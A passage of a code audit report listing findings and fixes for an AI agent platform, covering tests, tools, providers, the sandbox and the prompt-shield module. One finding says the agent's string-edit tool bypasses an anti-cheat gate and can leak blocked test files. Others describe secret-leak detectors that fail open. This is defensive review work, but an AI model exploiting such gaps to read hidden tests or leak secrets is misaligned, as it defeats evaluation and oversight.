| W5-99 | low | Raised (finder cited evidence; skeptic pass not run) | maintainability | `packages/maverick-shield/maverick_shield/builtin_rules.py:185` | Literal zero-width-space characters embedded in source (shield rule docstring and security corpus) are invisible in editors and diffs | Run `python -m ruff check --select PLE2515 --fix .` (4 sites) and add `PLE2515`/`PLE2502` to `select` so invisible or bidi characters can never re-enter source unescaped. | S |

### shield/cascade (1)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W2-42 | low | Raised (finder cited evidence; skeptic pass not run); prior | docs-accuracy | `packages/maverick-shield/maverick_shield/cascade.py:5` | cascade.py docstring quotes Constitutional-Classifiers-v2 efficacy (86%->4.4%) the module does not deliver | Rewrite the docstring to describe what ships: a recall-oriented regex/unicode cheap probe that gates an OPTIONAL, integrator-supplied deep scanner (default OFF); attribute the 86%->4.4% figure to the external paper as motivation, not as this module's measured result. Point to benchmarks/security/RESULTS.md for the real numbers. | S |

### shield/deobfuscate (1)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W2-39 | low | Raised (finder cited evidence; skeptic pass not run); prior | maintainability | `packages/maverick-shield/maverick_shield/deobfuscate.py:59` | Divergent homoglyph fold tables between builtin_rules and deobfuscate leave inconsistent Unicode coverage | Define ONE canonical homoglyph map (and one invisible/tag-char set) in a shared module and import it in both builtin_rules and deobfuscate; add a test asserting the two paths fold an identical confusable corpus. Expand the merged table using a real confusables source (Unicode TR39). | S |

### shield/guard (1)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W2-43 | low | Raised (finder cited evidence; skeptic pass not run) | security | `packages/maverick-shield/maverick_shield/guard.py:416` | Output-side secret-leak / phishing detectors fail open, so a detector bug lets plaintext secrets ride into a model answer | For the secret-leak sub-check specifically, fail toward redaction/block even under balanced profiles (a crashed leak detector on an outbound answer should withhold, not emit), or run secret_detector.redact unconditionally on the final answer as scan_output does not. At minimum surface the scan_error to the caller so the answer is flagged rather than silently delivered. | M |

### tests/agent-loop (1)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W1-43 | low | Raised (finder cited evidence; skeptic pass not run) | testing | `packages/maverick-core/tests/test_agent_loop_612.py:140` | Tests enshrine the _patch_validated reset and FINAL-marker happy path but never assert loop termination, verification of marker-less answers, or mid-run cancellation | Add to test_agent_loop*.py: (1) coding-mode always-reject script asserts <= N+1 LLM calls; (2) marker-less prose answer at depth 0 asserts verify_final is called; (3) status='cancelled' set during turn 1 asserts no further LLM calls; (4) role='<pack>' depth 0 asserts verification; (5) stop_reason='max_tokens' asserts continuation or error. | S |

### tests/assertions (1)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W5-72 | low | Raised (finder cited evidence; skeptic pass not run) | testing | `packages/maverick-core/tests/test_wave6.py:117` | 70 test functions contain no assertion or failure call at all (pass as long as nothing raises) | Add explicit assertions on return values/side effects for the 70 listed functions (list in the audit scratch: smells.json['no_assert']); for fuzz tests assert the fail-closed return value (None/False) rather than only the exception class. | S |

### tests/config (1)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W5-70 | low | Raised (finder cited evidence; skeptic pass not run) | testing | `pyproject.toml:99` | pytest configuration has no strict markers, warnings-as-errors, xfail_strict, timeout or randomized ordering, although the conftest documents three order-dependence incidents (#2410) | Add `--strict-markers`, `xfail_strict = true`, `timeout = 180`, `asyncio_mode = "strict"` explicitly, `filterwarnings = ["error::DeprecationWarning:maverick.*", "error::DeprecationWarning:maverick_channels.*"]` with targeted ignores, and a nightly `pytest-randomly` run (`-p randomly` with the seed printed) on the merge queue. | S |

### tests/consent (1)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W4-27 | low | Raised (finder cited evidence; skeptic pass not run) | testing | `packages/maverick-core/tests/test_consent_standards.py:410` | Missing regression tests: unified audit after unlink, expired-newer-receipt semantics, IAB GPP vectors, UTF-16 manifest, history-bound lifecycle | Add the five regression tests alongside the fixes; for standards, import the vectors from the IAB GPP spec text rather than generating them from the encoder under test. | S |

### tests/env-assumptions (1)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W5-127 | low | Raised (finder cited evidence; skeptic pass not run) | testing | `CLAUDE.md:62` | Test suite silently assumes a clean provider environment (ANTHROPIC_BASE_URL unset) and the contributor docs do not say so | Add an autouse conftest fixture (repo-root conftest.py) that `monkeypatch.delenv`s ANTHROPIC_BASE_URL / provider key vars for the 'nothing configured' tests, and add one line to CLAUDE.md Environment + CONTRIBUTING: 'run the suite with provider env vars unset (`env -u ANTHROPIC_BASE_URL ...`)'. | S |

### tests/env-isolation (1)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W5-14 | low | Raised (finder cited evidence; skeptic pass not run) | testing | `packages/maverick-core/tests/test_doctor_corrupt_config.py:53` | Six tests assume a clean provider environment and fail whenever ANTHROPIC_BASE_URL (or a sibling provider var) is exported | Add a root conftest autouse fixture that snapshots and strips every `*_API_KEY` / `*_BASE_URL` / MAVERICK_* provider variable (or a single `clean_provider_env` fixture reused by these tests), instead of per-test hand-written lists; document the invariant in CLAUDE.md's Testing rules. | S |

### tests/organisation (1)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W5-71 | low | Raised (finder cited evidence; skeptic pass not run) | maintainability | `packages/maverick-core/tests/test_q3_2026_batch13.py:1` | 66 grab-bag test files (test_q*_2026_batch*, test_*round*, test_wave*) hold 1,222 tests / 18.8k lines that are not co-located with the module under test | Split batch/round/wave files by target module (a mechanical AST move keeps history readable), and add a lint that new test files under tests/ must match `test_<existing module>` or carry a `# target: ` header. | M |

### tests/timing (1)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W5-68 | low | Raised (finder cited evidence; skeptic pass not run); prior | reliability | `packages/maverick-core/tests/test_q2_2026_batch1.py:141` | Timing-window assertions and 95 sleep() calls make several tests contention-sensitive on 2-core CI runners | Replace fixed sleeps with event/condition synchronisation; loosen pure-latency ceilings or move them behind a `perf` marker run in the serial phase; extend the heavy_concurrency serial phase to the >30 s CPU-bound tests so they stop starving neighbours. | M |

### tests/tools (1)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W1-136 | low | Raised (finder cited evidence; skeptic pass not run) | testing | `packages/maverick-core/tests/test_email_tool.py:41` | email_tool tests mock smtplib/imaplib but never assert a verified TLS context, and several connectors have only registration/smoke coverage | Add assertions that fake SMTP_SSL/IMAP4_SSL/starttls receive a context with verify_mode=CERT_REQUIRED; add tests for bigquery jobComplete=false, databricks stacked statements, currency provider fallback, and safe_client under HTTPS_PROXY. | S |

### tools/apply_patch (2)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W1-101 | low | Raised (finder cited evidence; skeptic pass not run) | correctness | `packages/maverick-core/maverick/tools/apply_patch.py:56` | apply_patch path extractor matches hunk CONTENT lines beginning with '--- '/'+++ ' — legitimate patches are refused as path traversal and file lists are wrong | Parse only header lines: restrict _PATH_RE to lines that follow a `diff --git`/`Index:` header or are immediately paired ('--- ' followed by '+++ '), or run `git apply --numstat`/`--summary` on the tempfile to list files instead of regexing the text. | S |
| W1-102 | low | Raised (finder cited evidence; skeptic pass not run) | reliability | `packages/maverick-core/maverick/tools/apply_patch.py:125` | apply_patch writes the patch tempfile on the HOST workdir but runs `git apply <basename>` through sandbox.exec — broken on every non-host-visible backend | Feed the patch via stdin using sandbox_run(sandbox, ['git','apply','--check','-'], stdin=patch_text) (after fixing the ARG_MAX issue) or gate on fs_is_host_visible and return an explicit 'not supported on this backend' error. | S |

### tools/bitbucket (1)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W1-140 | low | Raised (finder cited evidence; skeptic pass not run) | security | `packages/maverick-core/maverick/tools/bitbucket_tool.py:90` | bitbucket issues filter interpolates the raw `state` argument into the Bitbucket query language unquoted | Validate `state` against Bitbucket's enum (new/open/resolved/on hold/invalid/duplicate/wontfix/closed) or escape double quotes/backslashes before interpolation. | S |

### tools/cache_admin (1)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W1-134 | low | Raised (finder cited evidence; skeptic pass not run) | security | `packages/maverick-core/maverick/tools/cache_admin.py:33` | cache_admin purge is process-global and model-callable by default, so any agent or tenant can flush every other tenant's cached reads | Scope purge/stats to the caller's tenant/principal namespace (pass the same namespace string the registry uses), classify the tool high or operator-only, and defer it out of the default catalog (or register only when [tools] cache is enabled). | S |

### tools/calendar (1)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W1-126 | low | Raised (finder cited evidence; skeptic pass not run) | correctness | `packages/maverick-core/maverick/tools/calendar_tool.py:265` | calendar find_slot drops the 'unparseable events not counted as busy' warning on the end-of-day return path | Append `+ note` to the return at line 267-270 (and consider a unit test with an unparseable event followed by a free tail-of-day slot). | S |

### tools/capability_query (1)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W1-127 | low | Raised (finder cited evidence; skeptic pass not run) | correctness | `packages/maverick-core/maverick/tools/capability_query.py:39` | self_capability reports the deployment-wide grant, ignoring the per-user/channel ACL that actually applies to the run | Thread `channel` and the normalized `user:<id>` principal from base_registry into capability_query(...) and pass them through to capability_from_config(principal, channel=channel, user_id=user_id); add a test with a per-user deny list asserting op=check reports 'denied'. | S |

### tools/currency (1)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W1-125 | low | Raised (finder cited evidence; skeptic pass not run) | docs-accuracy | `packages/maverick-core/maverick/tools/currency.py:3` | currency tool's primary provider (exchangerate.host) now requires an access_key, so the documented 'no key required' path fails on every call and each request pays a wasted round-trip before the fallback | Make frankfurter the primary, drop or key-gate exchangerate.host behind EXCHANGERATE_ACCESS_KEY (query_auth), update the docstring/description, and add a unit test with mocked responses for both providers. | S |

### tools/dropbox (1)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W1-132 | low | Raised (finder cited evidence; skeptic pass not run) | performance | `packages/maverick-core/maverick/tools/dropbox_tool.py:100` | dropbox download reads the entire file into memory to return a 4 KB preview; upload has no size cap | Use `with httpx.stream('POST', ...) as r: r.read(max_bytes)` / iterate `iter_bytes` up to a cap (and a Range header where supported) in dropbox download; add a byte cap (e.g. 8 MB) to _rest_execute via `client.stream` before `.json()`; cap upload content length. | S |

### tools/identity (1)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W1-129 | low | Raised (finder cited evidence; skeptic pass not run) | docs-accuracy | `packages/maverick-core/maverick/tools/agent_identity.py:86` | agent_identity and crypto_budget_receipt take the HMAC key as a model-supplied argument, so their 'signatures' cannot prove provenance or integrity as documented | Either derive the key server-side from the run's handoff authority / a configured `[security] agent_identity_key` (never accepting it from args) or rewrite the descriptions to say 'demo/toy HMAC over a caller-supplied key; not an audit guarantee' and defer both tools out of the default catalog. | S |

### tools/privacy (1)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W1-128 | low | Raised (finder cited evidence; skeptic pass not run) | duplication | `packages/maverick-core/maverick/tools/dp_stats.py:22` | dp_stats and differential_privacy are two registered tools implementing the same Laplace mechanism with divergent argument contracts | Keep differential_privacy (the more validated one), fold dp_stats' clamped-sum op into it as `noisy_sum` with an optional `clamp`, and drop dp_stats from base_registry (or alias it during a deprecation window via maverick.deprecations). | S |

### tools/registry + spawn (1)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W1-39 | low | Raised (finder cited evidence; skeptic pass not run) | dx | `packages/maverick-core/maverick/tools/spawn.py:216` | Registry dispatch never validates model-supplied args against input_schema; spawn_subagent with a non-string role crashes inside Agent.__init__ (AttributeError) and is surfaced as an opaque tool error | Validate args against input_schema at ToolRegistry.run (cheap type/required check, jsonschema optional behind a knob) and return a structured 'ERROR: invalid arguments for <tool>: <path> expected <type>' so the model can self-correct; explicitly coerce/validate role/task in the spawn tools. | M |

### tools/str_edit anti-cheat (1)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W1-94 | low | Raised (finder cited evidence; skeptic pass not run) | security | `packages/maverick-core/maverick/tools/str_edit.py:138` | str_replace_editor str_replace/insert are not opaque-gated — a content oracle over blocked test files and .git | Apply the same _is_opaque_blocked_resolved gate to str_replace/insert/create in _dispatch_editor_command before dispatch, mirroring read_file/list_dir. | S |

### tools/validation (1)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W1-131 | low | Raised (finder cited evidence; skeptic pass not run) | security | `packages/maverick-core/maverick/tools/constrained_output.py:65` | constrained_output and adversarial_self_test compile model-supplied regexes in-process with no complexity/timeout guard (ReDoS) | Cap pattern and value lengths (e.g. 512 / 64k), reject nested quantifiers, or evaluate with a timeout (run in a subprocess or use the `regex` module's timeout) and return 'FAIL: pattern too complex'. | S |

### tools/wasm_run (1)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W1-103 | low | Raised (finder cited evidence; skeptic pass not run); prior | reliability | `packages/maverick-core/maverick/tools/wasm_run.py:69` | wasm_run passes host-absolute module/dir paths into the sandbox command — unusable under container backends, and unconfined when no sandbox is bound | Emit workspace-relative paths (candidate.relative_to(workdir)) so they resolve in either namespace, and make the no-sandbox branch fail closed. Same for notebook_exec. | S |

### web/marketing (1)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W3-79 | low | Raised (finder cited evidence; skeptic pass not run) | product | `web/index.html:152` | Marketing landing page positions Lightwork as an 'AI agent runtime', keeps the pre-rebrand 'M' favicon, and points 'Download'/'Source on GitHub' at a proprietary repo | Rewrite title/meta/h1 around the platform positioning (governed AI workforce, closed learning lifecycle, Operating Record), replace the favicon with the daybreak mark used by the dashboard, and make the CTAs match the licensing model (Request access / Book a demo; keep Docs). Update web/README.md domain references. | S |

### web/widget + extensions/widget (1)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W3-78 | low | Raised (finder cited evidence; skeptic pass not run) | dx | `extensions/widget/maverick-widget.js:8` | Two different embeddable widgets ship under the identical filename maverick-widget.js with incompatible data-attributes | Rename to lightwork-status-widget.js and lightwork-chat-widget.js (keep maverick-widget.js as a deprecation shim that logs a console warning), fix both READMEs and FEATURES.md, and add a route or a doc sentence stating how the file is meant to be served. | S |

### core/ai_business_intake (1)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W4-43 | improvement | Raised (finder cited evidence; skeptic pass not run) | product | `packages/maverick-core/maverick/ai_business_intake.py:556` | Business intake never proposes an EU AI Act category: eu_ai_act_category is the constant 'undetermined' even when prohibited/high-risk signals were collected | Emit a non-binding `eu_ai_act_candidate_category` (prohibited / high_risk / limited_risk / minimal / undetermined) with the triggering signals as reasons, keep legal_determination False and human_review_required True, and reference the Art. 5 / Annex III lists from ai_act.py so the two modules stay consistent. | S |

### core/ai_cloud_agent_governance (1)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W4-41 | improvement | Raised (finder cited evidence; skeptic pass not run) | product | `packages/maverick-core/maverick/ai_cloud_agent_governance.py:467` | Cloud-agent governance ships with process-local canonical authority: enforcement bindings and inventory revisions vanish on restart | Implement a GovernedRecordStore- or SQLite-backed ProviderRevisionAuthority/ProviderResourceRegistry with CAS semantics (mirroring ai_entity_tasks/ai_governance_loop), select it by config, and flip the status flags; until then label the cockpit page 'preview'. | L |

### core/cli doctor + config_lint (1)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W2-86 | improvement | Raised (finder cited evidence; skeptic pass not run) | ops | `packages/maverick-core/maverick/tenant/registry.py:639` | No doctor/config-lint check for the multi-tenant misconfigurations found in this audit | Add a `maverick tenant doctor` (or doctor section) that reports: by_user+roster, by_user+floor, Postgres roster with strict/RLS off, DSN role SUPERUSER/BYPASSRLS, rbac/workspace-selection entries referencing tenants not in the roster, and tenant ids whose encoded segment differs from the raw id. | M |

### core/config provider endpoints (1)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W1-21 | improvement | Raised (finder cited evidence; skeptic pass not run) | dx | `packages/maverick-core/maverick/config.py:679` | Ollama/Gemini/OpenRouter have no base_url env var (OLLAMA_HOST ignored); only config can repoint them | Add ('OLLAMA_HOST','OLLAMA_BASE_URL') for ollama (append /v1 like tgi/vllm do), OPENROUTER_BASE_URL and GEMINI_BASE_URL, in ONE shared map imported by llm.py and config.py. | S |

### core/consent_delivery_runtime + dashboard (1)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W4-20 | improvement | Raised (finder cited evidence; skeptic pass not run) | product | `packages/maverick-core/maverick/consent_delivery_runtime.py:1` | No worker/scheduler drives consent delivery: destinations are only updated when an admin clicks Dispatch | Add a gated dashboard-lifespan delivery supervisor (mirroring consent_scan_scheduler: bounded tenants, interval, lease renewal, sanitized health) and/or `maverick consent deliver --loop`; document manual-only mode otherwise. | M |

### core/proxy_auth (1)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W2-25 | improvement | Raised (finder cited evidence; skeptic pass not run) | dx | `packages/maverick-core/maverick/proxy_auth.py:86` | trusted_proxies matches peers by exact string only — no CIDR, no IPv4-mapped IPv6 normalization | Parse trusted_proxies with ipaddress.ip_network (accept CIDRs), normalize the peer with ipaddress.ip_address(...).ipv4_mapped, and reject unparsable entries at startup with a clear error. | S |

### core/security tests (1)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W5-67 | improvement | Raised (finder cited evidence; skeptic pass not run) | testing | `packages/maverick-core/tests/test_parser_fuzz.py:115` | Security parsers are fuzzed only by a hand-rolled, single-seed, 600-sample corpus; no property-based testing and no fuzz for SSRF guard or path-confinement helpers | Add hypothesis (dev extra) with `@given` strategies for URL/path/JSON envelopes; write property tests: confinement never returns a path outside base for any unicode/../symlink input, SSRF guard rejects every RFC1918/loopback/IPv6-mapped literal and DNS-rebind shape, signature verifiers reject any single-byte mutation of a valid envelope. Run 5 seeds in the parser fuzz. | M |

### core/tenant/kms (1)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W2-66 | improvement | Raised (finder cited evidence; skeptic pass not run) | security | `packages/maverick-core/maverick/tenant/kms.py:228` | Tenant DEKs are cached for the process lifetime by default, so a revoked cloud-KMS key keeps opening tenant data until restart | Default dek_cache_ttl to a bounded value (e.g. 300-3600 s) when [kms] provider is aws/gcp/vault, keeping 0 for LocalKMS; surface the effective TTL in doctor. | S |

### core/trust_receipt + trc (1)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W4-102 | improvement | Raised (finder cited evidence; skeptic pass not run) | testing | `packages/maverick-core/maverick/trust_receipt_verify.py:1092` | The standalone auditor verifier (trust_receipt_verify.py, 1,324 lines) and trc_evidence_collectors have no dedicated test modules | Add `test_trust_receipt_verify.py` driving `verify()`/`main()` with hand-built receipts (tampered row, expired key window, mismatched anchor digest, oversized receipt, legacy version) and `test_trc_evidence_collectors.py` for validate_request/validate_page/LocalSoc2Collector. | M |

### dashboard/app (exception handler) (1)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W2-29 | improvement | Raised (finder cited evidence; skeptic pass not run) | ux | `packages/maverick-dashboard/maverick_dashboard/app.py:2012` | Browser 401s redirect to /auth/login only when OIDC login is configured; SAML-only deployments land on a static 'Sign in required' page | Extend the redirect branch: if not login_on and saml_enabled(): redirect to /saml/login?return_to=...; render a 'sign in' link on error.html when either flow is on. | S |

### dashboard/app (observability auth) (1)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W2-30 | improvement | Raised (finder cited evidence; skeptic pass not run) | ops | `packages/maverick-dashboard/maverick_dashboard/app.py:10425` | /metrics requires the full admin static bearer or a user session — no scoped scrape credential for Prometheus | Add [dashboard] metrics_token (read-only, only valid for /metrics) and/or a metrics_allow_ips knob plus a wizard step; keep the admin bearer working for backward compatibility. | S |

### dashboard/suite-apis (guard enforcement) (1)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W3-16 | improvement | Raised (finder cited evidence; skeptic pass not run) | security | `packages/maverick-dashboard/maverick_dashboard/vendor_onboarding_api.py:55` | Route authorization is enforced by per-handler convention (a call inside the body) with no structural or CI guarantee | Adopt router-level `dependencies=[Depends(require_view)]` per APIRouter (with per-route escalation for admin/operate) so the minimum guard is structural, and/or commit an AST gate under scripts/ that fails CI when a non-public route handler cannot reach require_permission/require_global_permission/caller_principal transitively (whitelist the intentionally public routers). | M |

### dependencies/integrity (1)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W5-19 | improvement | Raised (finder cited evidence; skeptic pass not run) | supply-chain | `requirements/ci.txt:10` | pip installs across CI/release/Docker pin versions but never hashes (`--require-hashes` absent everywhere) | Generate a hashed lock (`pip-compile --generate-hashes` from the current ci.txt, per-marker) and use `--require-hashes` in install_release_cohort.py, the Dockerfile runtime stage and the binaries job; keep ci.txt as the human-reviewed constraint source. | M |

### deploy/github-action (1)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W5-26 | improvement | Raised (finder cited evidence; skeptic pass not run) | dx | `deploy/github-action/action.yml:60` | No repository automation tests the composite deploy/github-action with a real run, and its default python-version floats | Default `python-version` to the tested `3.12.13`, document consuming the action by full SHA, and add a nightly (schedule) run of the composite action with a real key and a $0.05 cap in an environment-protected job so the non-dry-run path is exercised at least once a day. | S |

### docs/tooling (1)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W5-128 | improvement | Raised (finder cited evidence; skeptic pass not run); prior | dx | `docs/press-kit.md:3` | Generate the headline counts in docs from code instead of hand-editing eleven files | Add `scripts/doc_counts.py` that prints the live counts and a test (`test_docs_counts.py`) asserting each cited literal in the listed files matches; optionally template the numbers via a `{{counts.packs}}` include so the docs cannot drift. | M |

### kernel/agent-loop prompt building (1)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W1-44 | improvement | Raised (finder cited evidence; skeptic pass not run) | product | `packages/maverick-core/maverick/agent.py:3413` | Orchestrator reads the blackboard only once (first user turn); later swarm signals never reach the deciding agent | Track a per-agent blackboard cursor; on each turn that runs tools, append a bounded text block of entries posted since the cursor (excluding the agent's own posts and sealed agents), capped by MAVERICK_BB_RENDER_ENTRY_CHARS, as a trailing text block in the tool_results user message (same slot as the step-budget warning at 4397-4406). | M |

### providers/base contract (1)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W1-11 | improvement | Raised (finder cited evidence; skeptic pass not run) | product | `packages/maverick-core/maverick/providers/base.py:353` | Provider interface has no tool_choice / strict-tool / disable_parallel_tool_use support | Thread an optional `tool_choice` ({'type':'auto'\|'any'\|'tool'\|'none', 'disable_parallel_tool_use'} in Anthropic vocabulary) and a per-tool `strict` flag through LLM.complete -> providers, translating to OpenAI's tool_choice/strict. Note forced 'any'/'tool' is rejected on Fable 5.1, so clamp to 'auto' + instruction there. Mark non-parallel_safe Tool objects with disable_parallel_tool_use. | M |

### providers/bedrock (1)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W1-10 | improvement | Raised (finder cited evidence; skeptic pass not run); prior | product | `packages/maverick-core/maverick/providers/bedrock_provider.py:31` | Bedrock adapter is bearer-key-only, routes Claude through the OpenAI translator (no caching/thinking/signatures) and ships a dated default model id | Re-implement BedrockClient on top of AnthropicClient using anthropic.AnthropicBedrockMantle / AsyncAnthropicBedrockMantle (aws_region from AWS_REGION, credentials from the default AWS chain), keep the OpenAI-compat bearer path as an explicit `auth_mode = "api_key"` option, map 'anthropic.<id>' ids to the Anthropic rate card for pricing, and update the default model id. | M |

### release/binaries (1)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W5-16 | improvement | Raised (finder cited evidence; skeptic pass not run) | product | `.github/workflows/release.yml:276` | PyInstaller release binaries have no reproducibility check and no platform code-signing/notarization | Add a second PyInstaller build with SOURCE_DATE_EPOCH and compare (or document why not reproducible), add Apple Developer ID signing + notarization (`codesign`/`notarytool`) and Windows Authenticode via CI secrets as docs/DISTRIBUTION.md:190-195 already plans, and add a linux-arm64 binary leg (ubuntu-24.04-arm). | M |

### repo/dev-loop (1)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W5-96 | improvement | Raised (finder cited evidence; skeptic pass not run) | dx | `AGENTS.md:13` | No Makefile/justfile/.editorconfig: the canonical dev commands exist only as prose in three files that disagree | Add a `justfile` (or Makefile) whose targets wrap post-create.sh, the pytest invocation, ruff+vulture and pre-push-lint.sh; reference `just test` from CLAUDE.md/AGENTS.md/CONTRIBUTING; add a root `.editorconfig`. | S |

### repo/lint-config (1)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W5-85 | improvement | Raised (finder cited evidence; skeptic pass not run) | dx | `pyproject.toml:55` | Ruff rule set leaves cheap real-bug families off; quantified incremental adoption list | Phase 1 (one PR, ~70 fixes): extend select with `ASYNC, DTZ, PLW1508, PLW1509, RUF012, RUF013, PLE2515, LOG, RUF100`. Phase 2: `TRY400, PLW1510, PLW2901` with `--fix`/manual (~240). Phase 3: ratchet `S110`, `PLW0603`, `BLE001`, `S608` via per-file-ignores baseline that only shrinks (same pattern as audit_contract.baseline.json). Keep S101/ANN/D/TRY003/EM/PLC0415/COM812 off and document why in the pyproject comment block. | M |

### repo/type-checking (1)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W5-89 | improvement | Raised (finder cited evidence; skeptic pass not run); prior | dx | `packages/maverick-knowledge/maverick_knowledge/store.py:83` | Type-checking baseline measured: pyright on the three leaf packages yields 158 errors, ~half optional-import noise and zero confirmed bugs in the sample — adopt as advisory only | Add a non-blocking CI step (`continue-on-error: true`) running `pyright packages/maverick-shield packages/maverick-knowledge packages/maverick-mcp` from the repo root with a `pyrightconfig.json` that sets `reportMissingImports: false`, `reportOptionalMemberAccess: "warning"`, `extraPaths` to the package roots; narrow `store.py` by asserting `_conn` once in a `_db()` accessor. Revisit gating only if the advisory run starts catching real regressions. | M |

### sandbox/docker+podman (1)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W1-107 | improvement | Raised (finder cited evidence; skeptic pass not run) | security | `packages/maverick-core/maverick/sandbox/docker.py:160` | Docker/podman hardening gaps: no read-only rootfs, --ipc none, --pull=never, ulimits, or seccomp profile; empty-string memory/pids config silently disables caps | Add opt-out --read-only + --tmpfs /tmp, --ipc none, --pull=never (with a pre-pull step in the wizard), --ulimit nofile=4096 and core=0; warn when memory/pids_limit parse to a disabled cap; share the flag builder between DockerBackend, PodmanBackend and the firecracker fallback. | M |

### tools/_rest_connector (1)

| ID | Sev | Status | Category | Location | Finding | Recommendation | Effort |
|---|---|---|---|---|---|---|---|
| W1-138 | improvement | Raised (finder cited evidence; skeptic pass not run) | dx | `packages/maverick-core/maverick/tools/_rest_connector.py:283` | _rest_execute collapses every upstream 4xx into 'upstream request failed', hiding validation errors the agent needs to self-correct | Extract a small allowlisted, length-capped set of JSON fields from the error body (message/detail/code/errors[].message), run them through safety.redact, and append them to the ERROR string; keep raw text bodies suppressed. | S |

## Appendix C — raised and rejected

Empty: the skeptic and refuter stages did not run, so nothing was rejected and nothing was independently upheld either. See the caveat at the top.


## Appendix D — coverage by dimension

What each finder read fully, sampled, or did not reach, in its own words.

**llm-providers** (W1-kernel, 22 raised)  
